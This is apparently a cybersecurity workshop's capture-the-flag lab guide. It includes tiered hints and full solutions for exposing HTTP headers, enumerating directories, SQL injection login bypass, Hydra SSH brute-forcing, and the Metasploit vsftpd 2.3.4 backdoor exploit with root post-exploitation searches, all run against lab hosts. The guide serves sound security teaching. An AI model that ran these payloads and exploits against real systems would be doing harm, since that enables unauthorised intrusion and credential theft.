# Lab 5: Mini CTF Challenge

**Duration:** ~30 minutes  
**Difficulty:** Mixed (Easy → Hard)  
**Flag Format:** `HACKCRAFT{...}`

## 🏁 Rules

1. **5 flags** are hidden across the lab environment
2. All flags follow the format: `HACKCRAFT{some_text_here}`
3. Use any tools available on the Kali machine
4. Hints are provided in 3 levels — try without hints first!
5. No brute-forcing the flag format — find them the intended way

---

## 🚩 Flag 1: The Talkative Server (Easy)

**Target:** CTF Server (10.10.10.40)  
**Category:** Information Disclosure

Web servers communicate using HTTP headers. Sometimes they say more than they should...

<details>
<summary>💡 Hint Level 1</summary>

HTTP responses contain headers that aren't visible in the browser. How do you view them?
</details>

<details>
<summary>💡 Hint Level 2</summary>

Use <code>curl -I http://10.10.10.40</code> or <code>curl -v http://10.10.10.40</code> to see all response headers.
</details>

<details>
<summary>💡 Hint Level 3 (Solution)</summary>

```bash
curl -I http://10.10.10.40
```
Look for a custom header in the response — it contains the flag.
</details>

---

## 🚩 Flag 2: The Hidden Path (Easy)

**Target:** CTF Server (10.10.10.40)  
**Category:** Directory Enumeration

Not every page on a website is linked from the homepage. Some directories are hidden — but not well enough.

<details>
<summary>💡 Hint Level 1</summary>

Tools like `dirb` or `gobuster` can discover hidden directories by trying common path names.
</details>

<details>
<summary>💡 Hint Level 2</summary>

```bash
dirb http://10.10.10.40
```
Look for a directory that returns a `200 OK` status.
</details>

<details>
<summary>💡 Hint Level 3 (Solution)</summary>

```bash
dirb http://10.10.10.40
# Find the "secret" directory, then:
curl http://10.10.10.40/secret/flag.txt
```
</details>

---

## 🚩 Flag 3: The Broken Login (Medium)

**Target:** CTF Server (10.10.10.40)  
**Category:** SQL Injection

The CTF server has a login form at `http://10.10.10.40/login.php`. It has 3 users in its database — but one of them is hidden. Can you log in as the hidden user?

<details>
<summary>💡 Hint Level 1</summary>

SQL Injection lets you modify the database query. What happens if you enter `' OR '1'='1` as the username?
</details>

<details>
<summary>💡 Hint Level 2</summary>

The goal is to get the **hidden** user's record. Try:
- Username: `' OR role='hidden' --`
- Password: `anything`
</details>

<details>
<summary>💡 Hint Level 3 (Solution)</summary>

Navigate to `http://10.10.10.40/login.php` and enter:
- **Username:** `' OR role='hidden' -- `
- **Password:** `x`

Or from Kali:
```bash
curl -X POST http://10.10.10.40/login.php \
  -d "username=' OR role='hidden' -- &password=x"
```
The hidden user's password IS the flag.
</details>

---

## 🚩 Flag 4: The Weak Lock (Medium)

**Target:** CTF Server (10.10.10.40)  
**Category:** Password Cracking

The CTF server has an SSH service running. There's a user with a weak password. Can you crack it?

<details>
<summary>💡 Hint Level 1</summary>

Hydra is a password brute-forcing tool. You need a username and a wordlist. The username might be discoverable...
</details>

<details>
<summary>💡 Hint Level 2</summary>

```bash
# Try common usernames with the provided wordlist
hydra -l ctfuser -P /usr/share/wordlists/custom/rockyou-mini.txt \
  ssh://10.10.10.40
```
</details>

<details>
<summary>💡 Hint Level 3 (Solution)</summary>

```bash
# Crack the SSH password
hydra -l ctfuser -P /usr/share/wordlists/custom/rockyou-mini.txt \
  ssh://10.10.10.40

# Once cracked, SSH in and find the flag
ssh ctfuser@10.10.10.40
# Enter the cracked password

cat ~/flag.txt
```
</details>

---

## 🚩 Flag 5: The Deep Dive (Hard)

**Target:** Metasploitable (10.10.10.30)  
**Category:** Exploitation + Post-Exploitation

Remember the vsftpd 2.3.4 backdoor from Lab 4? Exploit it again and look around. There's a flag hidden on the system.

<details>
<summary>💡 Hint Level 1</summary>

Use Metasploit to exploit the vsftpd backdoor (same as Lab 4). Once you have a shell, search for files containing "HACKCRAFT".
</details>

<details>
<summary>💡 Hint Level 2</summary>

After getting a shell:
```bash
find / -name "*.txt" 2>/dev/null | head -20
grep -r "HACKCRAFT" / 2>/dev/null
```
</details>

<details>
<summary>💡 Hint Level 3 (Solution)</summary>

```bash
# In msfconsole:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.30
run

# Once you have a shell:
grep -r "HACKCRAFT" /root/ 2>/dev/null
# or
find / -name "flag*" 2>/dev/null
cat /root/flag.txt
```

> **Note:** If the Metasploitable container doesn't have a pre-planted flag, you get credit for demonstrating the exploit + root access. The real-world lesson: once you have root, EVERYTHING on the system is compromised.
</details>

---

## 📊 Scoreboard

| Flag | Points | Found? |
|------|--------|--------|
| Flag 1: The Talkative Server | 100 | ☐ |
| Flag 2: The Hidden Path | 100 | ☐ |
| Flag 3: The Broken Login | 200 | ☐ |
| Flag 4: The Weak Lock | 200 | ☐ |
| Flag 5: The Deep Dive | 300 | ☐ |
| **Total** | **900** | |

### Rating:
- **0-200 points:** Keep practicing! Review the lab guides.
- **300-500 points:** Good start! You've got the basics down.
- **600-700 points:** Solid work! You think like a pentester.
- **800-900 points:** Excellent! Consider a career in cybersecurity.

---

## 🏆 Congratulations!

You've completed the HackCraft workshop! Here's what you've learned:

| Day | Skills |
|-----|--------|
| Day 1 | Network scanning, service enumeration, wireless security concepts |
| Day 2 | Vulnerability assessment, exploitation, password cracking, SQL injection |

### What's Next?

1. **Practice more:** [TryHackMe](https://tryhackme.com) — Free beginner-friendly rooms
2. **Level up:** [HackTheBox](https://hackthebox.com) — Intermediate challenges
3. **Learn web security:** [PortSwigger Web Security Academy](https://portswigger.net/web-security) — Free
4. **Get certified:** CompTIA Security+, CEH, OSCP
5. **Join communities:** r/netsec, r/cybersecurity, local security meetups

### Remember:
> **With great power comes great responsibility.**  
> Only test systems you own or have explicit permission to test.  
> Always practice responsible disclosure.

---

## 🔙 [Back to Workshop Home](../../README.md)
